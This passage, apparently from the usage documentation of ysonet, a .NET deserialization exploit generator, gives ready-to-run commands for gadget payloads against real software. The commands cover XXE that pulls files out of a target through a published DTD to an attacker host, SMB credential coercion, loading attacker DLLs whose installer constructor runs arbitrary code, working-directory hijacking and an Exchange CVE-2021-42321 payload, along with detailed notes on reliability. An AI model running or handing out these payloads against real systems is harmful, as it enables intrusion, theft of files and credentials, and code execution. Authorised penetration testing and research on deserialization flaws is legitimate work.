  framework (its `TargetFrameworkAttribute`, not the installed runtime), or when
  the machine sets `EnableLegacyXmlSettings` to 1 under
  `HKLM\SOFTWARE\Microsoft\.NETFramework\XML` or the same key in `HKCU`. Put
  another way: a modern runtime is not a defence on its own, but a modern target
  framework is.
- This is a network effect, not file disclosure. A fetched DTD proves SSRF and
  outbound reachability. The setter reads elements and attributes only, never
  entity text, and returns nothing to you, so it is not a way to read a file off
  the target.
- Only five formatters can carry it, and that is structural rather than
  unfinished work. `DataViewManager` implements `IList`, so a serializer that
  infers a contract (Json.NET, YamlDotNet, DataContractSerializer,
  NetDataContractSerializer, XmlSerializer, DataContractJsonSerializer,
  MessagePack typeless) treats it as a COLLECTION and never calls the property
  setter. BinaryFormatter, SoapFormatter, LosFormatter and FsPickler restore
  fields without calling any setter, and the type is not `[Serializable]` anyway.
- The URL must be http or https and must not contain a double quote, `<`, `>`,
  a backslash, whitespace or a control character, because it is placed inside a
  quoted DTD external identifier. Percent-encode anything else. Query strings
  are fine: `&` and `%` are literal there. `--rawinput` skips that check for
  research on a resolver that accepts something else; it does NOT turn off the
  escaping that keeps the outer payload a valid document.

### Reach the same XML gate through a DataSet, and read a file back

`DataSetXxe` is the other half of the same story. `System.Data.DataSet` is
`ISerializable`, and its deserialization constructor hands the `XmlSchema` member
to the same kind of legacy `XmlTextReader`. So the gate is identical, but the
carrier and the formatters are the opposite ones: `DataViewManagerXxe` needs a
serializer that calls a property SETTER, and `DataSetXxe` needs one that invokes
the serialization CONSTRUCTOR.

Variant 1 is the same single fetch, on five different formatters:

```bash
./ysonet.exe -g DataSetXxe -f BinaryFormatter -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataSetXxe -f SoapFormatter   -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataSetXxe -f LosFormatter    -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataSetXxe -f Json.NET        -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataSetXxe -f FsPickler       -c "http://10.0.0.5:8080/x.dtd"
```

Variant 2 goes further and actually reads a file off the target. It needs a host
you control and produces TWO artifacts: the payload, and a DTD you have to
publish. `-c` is the BASE URL of your host, `--file` is what to read on the target
(usually a `file:` URI), and `--dtd-out` is where ysonet writes the DTD for you.

```bash
./ysonet.exe -g DataSetXxe -f BinaryFormatter --variant 2 \
  -c "http://10.0.0.5:8080/" \
  --file "file:///C:/Windows/system.ini" \
  --dtd-out ./dataset-oob.dtd \
  -o base64
```

Then publish `dataset-oob.dtd` at `http://10.0.0.5:8080/dataset-oob.dtd` and watch
`http://10.0.0.5:8080/collect`. The DTD ysonet writes is readable on purpose:

```text
<!ENTITY % file SYSTEM "file:///C:/Windows/system.ini">
<!ENTITY % build "<!ENTITY &#x25; exfil SYSTEM 'http://10.0.0.5:8080/collect?d=%file;'>">
%build;
%exfil;
```

The target fetches the DTD, `%file;` reads the file, `%build;` declares `%exfil;`
with the content already substituted into the URL, and referencing `%exfil;` sends
it. The file arrives in the `d=` query string of the request to `/collect`.

What to expect from variant 2:

- The same pre-4.5.2 XML gate applies. Nothing at all happens on a target with
  the modern defaults.
- WHAT COMES BACK, measured rather than assumed. Spaces, line breaks, `<`, `>`
  and `"` all arrive percent-encoded and decode cleanly, and size is not the
  limit (4 KB came back intact; the reader's own entity budget is 10,000,000
  characters). But any of `&`, `%`, `'` or `#` anywhere in the file BREAKS the
  chain and you get no second request at all: the first three end a construct
  inside the DTD, and the last starts a URI fragment. That is why a short `.ini`
  style file comes back whole and a config file full of entity references or
  apostrophes does not.
- Neither `-c` nor `--file` is validated in variant 2. What counts as a system
  identifier is the TARGET parser's decision, so a bare Windows path, a UNC path,
  a non-http host for the DTD, or a base URL that already carries a query string
  all go through exactly as typed. Only a double quote really breaks the DTD,
  because it ends the quoted identifier the value sits in; `%` and `&` are literal
  there, so `file:///C:/Program%20Files/x.txt` is the right way to write a space.
  (Variant 1 still checks its `-c` and still has `--rawinput` to skip that.)
- `--dtd-out` is taken at face value. A file already there is REPLACED and a
  missing folder is created, so generating twice to the same path works, and
  ysonet says on stderr when it replaced something. ysonet writes UTF-8 with no
  BOM. The DTD is written only after the payload is built, so a run that fails
  leaves whatever is at that path untouched.
- Nothing on YOUR machine is opened. `--file` is a path on the target; it is
  written into the hosted DTD as text and is never resolved while building.
- Variant 1 refuses `--file` and `--dtd-out` instead of ignoring them, so a
  forgotten `--variant 2` is an error rather than a payload that discloses
  nothing.

### Reach the same XML gate through XmlDocument, and lift the version gate

`XmlDocumentXxe` is the shortest carrier in this family. `System.Xml.XmlDocument.InnerXml`
has a setter that is literally `set { LoadXml(value); }`, so assigning one string parses
it - and `LoadXml` builds the same legacy `XmlTextReader` as the two gadgets above. The
carrier needs only `System.Xml`, which every target has.

Variant 1 is the familiar one: set `InnerXml` and let the target's own reader default
decide.

```bash
./ysonet.exe -g XmlDocumentXxe -f Xaml                  -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentXxe -f JavaScriptSerializer  -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentXxe -f FastJson              -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentXxe -f YamlDotNet            -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentXxe -f SharpSerializerXml    -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentXxe -f SharpSerializerBinary -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentXxe -f MessagePackTypeless   -c "http://10.0.0.5:8080/x.dtd"
```

Variant 2 is the reason to reach for this gadget over the other two. It assigns a real
`System.Xml.XmlUrlResolver` to `XmlDocument.XmlResolver` BEFORE `InnerXml`. A document
that has been given a resolver uses THAT one, so the 4.5.2 hardening never gets a say
and the payload fires against a current application on a current runtime.

```bash
./ysonet.exe -g XmlDocumentXxe -f Xaml --variant 2 -c "http://10.0.0.5:8080/x.dtd"
```

Five things to know:

- VARIANT 2 HAS NO VERSION GATE. That is the whole point of it, and it is why this gadget
  declares 4.0 - 4.5.1 for variant 1 and 4.0 - 4.8.1 for variant 2. Unlike the other two
  XXE gadgets, `ysonet.exe -t` really does fetch on variant 2, from your own machine.
- THE ORDER IS THE PAYLOAD. The resolver has to be assigned before `InnerXml`, or the
  parse happens before it exists. ysonet always emits it that way; if you hand-edit a
  payload, keep the order.
- Variant 2 costs two formatters, and both were measured rather than assumed. FastJson
  cannot fill the nested `XmlResolver` member at all, and YamlDotNet inspects types
  through a readable-properties inspector while `XmlDocument.XmlResolver` is write-only.
  Both pairs are refused with a message that says so, rather than emitted as a payload
  that would deserialize and do nothing.
- The gadget-wide list is short for structural reasons. `XmlDocument` is not
  `[Serializable]`, so BinaryFormatter, SoapFormatter, LosFormatter and FsPickler are out;
  and `XmlNode` implements `IEnumerable`, so Json.NET builds an ARRAY contract and the
  DataContract family plus XmlSerializer build a collection contract. Compared with
  `DataViewManagerXxe`, this carrier implements only `IEnumerable` rather than `IList`,
  which is what wins back YamlDotNet and the two MessagePack flavours.
- On the two MessagePack formatters, the target's own library matters:
  MessagePack-CSharp before 2.3.75 calls EVERY setter on a type it builds, and
  `XmlNode.Value` throws whatever it is given, so the read dies before the parse. That is
  a limit of the target, not of the payload.

### Reach the same XML gate with no property setter at all

`XmlDocumentSurrogateXxe` gets to the very same `InnerXml` setter without the payload ever
naming a property. `System.Workflow.ComponentModel.Serialization.XmlDocumentSurrogate`
contains a private nested `XmlDocumentReference` class that is `[Serializable]` and
implements `IObjectReference`, with one private `string innerXml` field. A formatter
restores that field and then calls `GetRealObject`, which does
`new XmlDocument()` and `xmlDocument.InnerXml = innerXml`.

You do NOT have to get a surrogate selector registered on the target. Only the type name
has to resolve, and it does - private nested types are found by name like any other.

```bash
./ysonet.exe -g XmlDocumentSurrogateXxe -f BinaryFormatter            -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentSurrogateXxe -f SoapFormatter              -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentSurrogateXxe -f LosFormatter               -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentSurrogateXxe -f NetDataContractSerializer  -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentSurrogateXxe -f DataContractSerializer     -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentSurrogateXxe -f DataContractJsonSerializer -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g XmlDocumentSurrogateXxe -f FsPickler                  -c "http://10.0.0.5:8080/x.dtd"
```

Variant 2 goes further and reads a file off the target, exactly the way `DataSetXxe`
variant 2 does. It needs a host you control and produces TWO artifacts: the payload, and a
DTD you have to publish. `-c` is the BASE URL of your host, `--file` is what to read on the
target, and `--dtd-out` is where ysonet writes the DTD for you.

```bash
./ysonet.exe -g XmlDocumentSurrogateXxe -f BinaryFormatter --variant 2   -c "http://10.0.0.5:8080/"   --file "file:///C:/Windows/system.ini"   --dtd-out ./xmldocsurrogate-oob.dtd   -o base64
```

Publish it at `http://10.0.0.5:8080/xmldocsurrogate-oob.dtd` and watch
`http://10.0.0.5:8080/collect`. Everything the `DataSetXxe` variant 2 notes say about what
comes back applies here unchanged, including that any of `&`, `%`, `'` or `#` anywhere in
the file breaks the chain and you get no second request at all. The companion file has its
OWN name, so you can host both gadgets' DTDs on one server without either overwriting the
other.

Five things to know:

- The target needs `System.Workflow.ComponentModel` - the same assembly the
  `ActivitySurrogate*` gadgets need. A target that accepts those accepts this.
- It is legacy-gated and CANNOT lift that gate. `GetRealObject` builds a fresh
  `XmlDocument` and never assigns a resolver, so there is nowhere to put one; if you need
  a payload for a modern target, use `XmlDocumentXxe --variant 2`.
- The formatter list is the OPPOSITE family to the two setter gadgets, which is the reason
  this gadget exists. It needs a serializer that restores a `[Serializable]` type's fields
  AND performs the `IObjectReference` fixup - two independent conditions. Json.NET,
  JavaScriptSerializer and SharpSerializerXml deliver the field perfectly and never run
  the fixup, so they would deserialize cleanly and do nothing; they are not advertised.
- FsPickler is advertised, and it behaves differently on purpose. It runs the fixup - the
  `XmlDocument` really is built, so the fetch really happens - and then throws
  `InvalidCastException` casting the result back to the declared type. For this gadget
  that costs nothing, because the whole effect completes inside `GetRealObject`.
- Variant 1 refuses `--file` and `--dtd-out` instead of ignoring them, so a forgotten
  `--variant 2` is an error rather than a payload that discloses nothing.

### Make the target read a directory tree you name

`BootstrapperBuilder` is the widest of these: twelve serializers reach one string
setter. `Microsoft.Build.Tasks.Deployment.Bootstrapper.BootstrapperBuilder.Path`
refreshes the object as soon as it is assigned, which enumerates
`<your path>\Engine`, walks its subdirectories, and XML-parses every `setup.xml`
it finds. The assembly ships with the .NET Framework redistributable, so the
target needs no reference of its own.

```bash
# a UNC directory: the target opens an SMB session to that host before it reads anything
./ysonet.exe -g BootstrapperBuilder -f Json.NET -c "\10.0.0.5\share"

# a local directory on the target, on a formatter with no [Serializable] requirement
./ysonet.exe -g BootstrapperBuilder -f Xaml -c "C:\ProgramData\bootstrapper"
```

Things to know:

- The SMB session happens whether or not anything is there to read, which is what
  makes it a credential-coercion primitive against an empty share.
- A `setup.xml` you leave on the share is parsed with legacy XML defaults, so it is
  attacker-controlled input to an old parser.
- BF, Soap, Los and FsPickler are out because the type is not `[Serializable]`, and
  `XmlSerializer` refuses it in its own constructor over the read-only `Products`
  collection - a member the payload never mentions.
- `-t` is accepted and reads the path on your own machine.

### Make the target set a timestamp on a path you name

`FileSystemInfoTimeSetter` writes one of the file or directory timestamps through
`File`/`Directory.SetXxxTimeUtc`. The write is the point on a local path; on a UNC
path the OPEN is the point, because it is an outbound SMB session - and unlike the
`FileSystemInfo` gadget above it needs no MS-DOS short name to get there.

```bash
# variant 1 is a file, variant 2 a directory
./ysonet.exe -g FileSystemInfoTimeSetter -f Xaml -c "\10.0.0.5\share\x" --variant 1
./ysonet.exe -g FileSystemInfoTimeSetter -f Xaml -c "C:\ProgramData" --variant 2 --member lastwrite
```

### Make the target fetch a URL through a type converter

`XamlTypeConverterFetch` needs no `ObjectDataProvider` and no constructor: one
ordinary XAML attribute is enough. The parser picks the member's own
`[TypeConverter]`, hands it your text, and the converter opens it.

```bash
# variant 1: an image source, whose decode is deferred, so the read completes cleanly
./ysonet.exe -g XamlTypeConverterFetch -f Xaml -c "http://10.0.0.5/x.png" --variant 1

# variant 2: a cursor, which refuses the bytes AFTER fetching them
./ysonet.exe -g XamlTypeConverterFetch -f Json.NET -c "http://10.0.0.5/x.cur" --variant 2
```

`ColorConvertedBitmapExtension` is the three-request version of the same idea. Its
single constructor argument carries an image URI and two ICC colour-profile URIs,
and the target fetches all three. Both profile options are REQUIRED and have no
default: WPF parses the source profile FIRST, and a reply that is not a valid ICC
profile throws before the other two requests happen.

```bash
./ysonet.exe -g ColorConvertedBitmapExtension -f Xaml -c "http://10.0.0.5/img.png" \
  --source-profile "http://10.0.0.5/src.icc" \
  --destination-profile "http://10.0.0.5/dst.icc"
```

Remote image and profile loading is documented WPF behaviour for both of these, so
they are a delivery shape rather than a new bug.

### Make the target load an assembly from a path you name

`AssemblyCatalogLoad` turns one string into a loaded assembly through a PUBLIC
constructor. `System.ComponentModel.Composition.Hosting.AssemblyCatalog(string codeBase)`
is MEF, in the .NET Framework GAC since 4.0, so the target needs no application reference.
Its constructor calls `AssemblyName.GetAssemblyName(codeBase)`, which OPENS the path, and
then `Assembly.Load` on the identity it read - and because `GetAssemblyName` also fills in
`AssemblyName.CodeBase`, the loader falls back to your path when normal probing has no such
assembly. One string, two effects:

- a UNC value starts an SMB session (Windows sends authentication material with it, and
  nothing has to exist on the share); and
- a reachable assembly is loaded into the target's default load context.

Only XAML can build it, because the constructor argument is the only way in and
`x:Arguments` is the only thing in this catalogue that passes one.

```bash
# a path the target can already open
./ysonet.exe -g AssemblyCatalogLoad -f Xaml -c "C:\programdata\payload.dll"

# a UNC path: the target opens it over SMB (credential coercion, or a remote load)
./ysonet.exe -g AssemblyCatalogLoad -f Xaml -c "\\10.0.0.5\share\payload.dll"
```

Things to know:

- THE LOAD ALONE RUNS NO CODE. A bare `Assembly.Load` does not run a module initializer,
  and the catalog only STORES the assembly - it does not enumerate its types. Execution
  needs one more step that belongs to the target: it touches the catalog (enumerating its
  parts builds a `TypeCatalog` and honours the assembly's own `[CatalogReflectionContext]`
  attribute), it resolves a type from the loaded assembly by name, or the assembly is mixed
  mode and its native `DllMain` runs at load. If you need code to run on the load itself,
  `AssemblyInstallerLoad` (below) is the stronger gadget where its requirements are met.
- `-t` IS A SELF-EXPLOIT and is accepted: it deserializes the payload in the ysonet
  process, which loads your assembly HERE (and a .NET assembly cannot be unloaded from an
  AppDomain). Only `-t` a path you trust.
- `-c` is taken as typed. There is no extension, path-shape or UNC check: what the value
  means is the TARGET's decision, and ysonet never opens it while building. A `.dll`, a
  managed `.exe`, a local path and a UNC path are all valid.
- UNC delivery is configuration dependent, the same way `AssemblyInstallerLoad`'s is: the
  SMB session and any authentication callback happen regardless, but LOADING an assembly
  from a share needs the target to classify it as Local Intranet (a bare IP is Internet
  zone and needs `loadFromRemoteSources=true`). A DNS or SMB callback proves the target
  TRIED to open the path, not that it loaded the assembly.
- If `--minify` would trim your path (it strips leading and trailing whitespace off the
  argument text), generation is refused rather than shipping a payload that names a
  different file. A carriage return is refused with or without `--minify`, because XML
  normalizes it away on every parser. A tab, a repeated interior space and a `"; "`
  sequence all survive here, because the value travels in element text rather than an
  attribute.

### Make the target load your own installer DLL and run it

`AssemblyInstallerLoad` is a bring-your-own-DLL gadget. Setting
`System.Configuration.Install.AssemblyInstaller.Path` makes the target call
`Assembly.LoadFrom` on the path you give it, and reading `HelpText` afterwards makes it
build every public, non-abstract `System.Configuration.Install.Installer` subclass in
that assembly that is marked `[RunInstaller(true)]`. Your installer's CONSTRUCTOR is
what runs. ysonet never produces the DLL.

Your DLL needs a class like this, and nothing else:

```csharp
using System.ComponentModel;
using System.Configuration.Install;

[RunInstaller(true)]
public class Boom : Installer
{
    public Boom() { /* your code here */ }
}
```

```bash
# variant 1: a path the target can already open
./ysonet.exe -g AssemblyInstallerLoad -f Json.NET -c "C:\programdata\installer.dll"

# variant 2: the target fetches it from your share over SMB
./ysonet.exe -g AssemblyInstallerLoad -f Json.NET --variant 2 -c "\\10.0.0.5\share\installer.dll"

# the other formatters (PropertyGrid carrier only)
./ysonet.exe -g AssemblyInstallerLoad -f Xaml -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f FastJson -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f JavaScriptSerializer -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f YamlDotNet -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f SharpSerializerXml -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f SharpSerializerBinary -c "C:\programdata\installer.dll"
./ysonet.exe -g AssemblyInstallerLoad -f MessagePackTypeless -c "C:\programdata\installer.dll"

# a different getter carrier (Json.NET and Xaml only)
./ysonet.exe -g AssemblyInstallerLoad -f Xaml --getter 3 -c "C:\programdata\installer.dll"

# the BindingSource carrier: no WinForms control is built, so it suits a headless target
./ysonet.exe -g AssemblyInstallerLoad -f FastJson --getter 5 -c "C:\programdata\installer.dll"
```

Things to know:

- `-t` IS A SELF-EXPLOIT and is accepted: it deserializes the payload in the ysonet
  process, which loads your DLL and runs its installer constructors on YOUR machine
  - the same self-run `-t` performs for every other gadget. Only `-t` a DLL you
  trust; to hit the target instead, generate and deliver the payload.
- Without a `[RunInstaller(true)]` installer class, the payload is only an assembly
  load. That is still useful (a module initializer or a static constructor may run),
  but it is not the same thing.
- `-c` must be a PATH to a `.dll` or a managed `.exe`. A bare program name such as
  `calc.exe` is refused, because it would be resolved against whatever directory the
  target process happens to be in.
- UNC delivery is configuration dependent. .NET only loads an assembly from a share
  it classifies as Local Intranet; a share reached by a bare IP is Internet zone and
  the load fails with `0x80131515` unless the target sets `loadFromRemoteSources=true`.
  The target must also be able to reach the share at all: SMB egress, share
  permissions, and Mark-of-the-Web all apply. A DNS or SMB callback proves the target
  TRIED, not that it loaded the assembly.
- BOTH VARIANTS DECLARE 4.0 - 4.8.1, and that is a statement about the CHAIN, not about
  remote loading. The payload names the 4.0.0.0 `System.Configuration.Install` and
  `System.Windows.Forms` identities, so an older runtime cannot bind them, and on 4.0 the
  `Path` setter, `HelpText` and the carriers already behave as they do on the newest build.
  The zone rule above applies on every build in that span, so it is not something the
  version axis can express - which is why it lives here and in `--variant`'s own help.
- `--getter` picks the carrier that reads `HelpText`, and the five carriers do NOT all
  work on the same formatters:
  - `--getter 1` (PropertyGrid) works everywhere and is the default.
  - `--getter 2` (ComboBox), `3` (ListBox) and `4` (CheckedListBox) need a formatter that
    can add to a read-only `Items` collection, which is Json.NET and Xaml only.
  - `--getter 5` (BindingSource) is the opposite: it needs a formatter that will call the
    `DataMember` and `DataSource` setters, so it works with Xaml, FastJson,
    JavaScriptSerializer and both SharpSerializer flavours, and is REFUSED on Json.NET,
    YamlDotNet and both MessagePack flavours. Those four see that `BindingSource`
    implements `IList` and populate it with `Add` instead of calling the setters, so the
    payload would deserialize cleanly and do nothing.

  BindingSource is worth knowing about because it is the only carrier that is not a
  WinForms CONTROL - it is a `Component` with no window - so it suits a headless web or
  service process. It is also the only alternative to PropertyGrid on FastJson,
  JavaScriptSerializer and the two SharpSerializer flavours.

  ComboBox reads `HelpText` more than once, but your installer is still constructed
  only once: `AssemblyInstaller` sets a private `initialized` flag after the first read.
- Not the same gadget as `XamlAssemblyLoadFromFile`, which takes C# SOURCE, compiles it
  while building and embeds the assembly in the payload (and needs WPF on the target).
  This one takes a path to an assembly you already have, and can deliver it over SMB.
- If `--minify` would rewrite your path (the YAML minifier collapses repeated spaces,
  the XML one collapses `"; "`), generation is refused rather than shipping a payload
  that names a different file. Drop `--minify` or use a simpler path.

### Move the target process's working directory

`FileSystemProxyCurrentDirectory` sets
`Microsoft.VisualBasic.MyServices.FileSystemProxy.CurrentDirectory`, whose one-line body
is `Directory.SetCurrentDirectory(value)`. Deserializing the payload moves the TARGET
process's working directory - every thread, for the rest of the process's life. This is
NOT code execution on its own. Its value is what the target does with a relative path
afterwards: a bare-name native `LoadLibrary` or a relative `Assembly.LoadFrom` resolves
against the working directory, a relative file read returns whatever you put there, and a
relative write lands where you chose. It is the in-box equivalent of the xunit
`PreserveWorkingFolder` gadget, needing no third-party assembly.

```bash
# point the target at a share you control, so a later bare-name library load pulls your DLL
./ysonet.exe -g FileSystemProxyCurrentDirectory -f Json.NET -c "\\10.0.0.5\share"

# a local directory works too
./ysonet.exe -g FileSystemProxyCurrentDirectory -f NetDataContractSerializer -c "C:\programdata\attacker"
./ysonet.exe -g FileSystemProxyCurrentDirectory -f DataContractSerializer -c "C:\programdata\attacker"
./ysonet.exe -g FileSystemProxyCurrentDirectory -f DataContractJsonSerializer -c "C:\programdata\attacker"
./ysonet.exe -g FileSystemProxyCurrentDirectory -f MessagePackTypeless -c "C:\programdata\attacker"
```

Things to know:

- Only these six formatters are advertised, and the reason is the type's constructor:
  `FileSystemProxy` is public but its only constructor is `internal`, with no
  parameterized one. Json.NET builds it in its DEFAULT configuration (it falls back to a
  non-public default constructor when there is no parameterized creator), the DataContract
  family builds a plain POCO with no constructor call, and MessagePack constructs the
  shape. Everything that insists on a PUBLIC parameterless constructor
  (JavaScriptSerializer, FastJson, YamlDotNet, Xaml, both SharpSerializer flavours) is out,
  and so are the `[Serializable]`-only formatters (BinaryFormatter, SoapFormatter,
  LosFormatter, FsPickler).
- The other two carriers for the same sink, `System.Environment.CurrentDirectory` and
  `Microsoft.VisualBasic.FileIO.FileSystem.CurrentDirectory`, are STATIC and cannot be
  named by any of these serializers, which is why the proxy is the one that ships.
- `-t` deserializes here, so it moves the ysonet process, and then puts the directory back
  so the rest of the run is unaffected. Run with `--debugmode` to see the before and after.
- If `--minify` would rewrite your directory (the XML minifier trims trailing whitespace
  from a text node), generation is refused rather than shipping a payload that moves the
  target somewhere else. Drop `--minify` or use a path with no trailing space.

### Generate a minified BinaryFormatter payload for Exchange CVE-2021-42321

Uses the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.

```bash
./ysonet.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```

## Installation diagnostics and structured discovery

Use `ysonet.exe doctor` for a read-only report of runtime, architecture, required
files, optional local-test hosts and completion configuration. See
[installation diagnostics](getting-started.md#installation-diagnostics) for exit
codes and the checks' limits.

`ysonet.exe --list catalog` exports versioned JSON for integrations; add `-g NAME`
or `-p NAME` for one module. `--list catalog-schema` emits the schema. See the
[JSON catalog contract and stability policy](json-catalog.md). The other list
categories keep their existing newline-separated output.
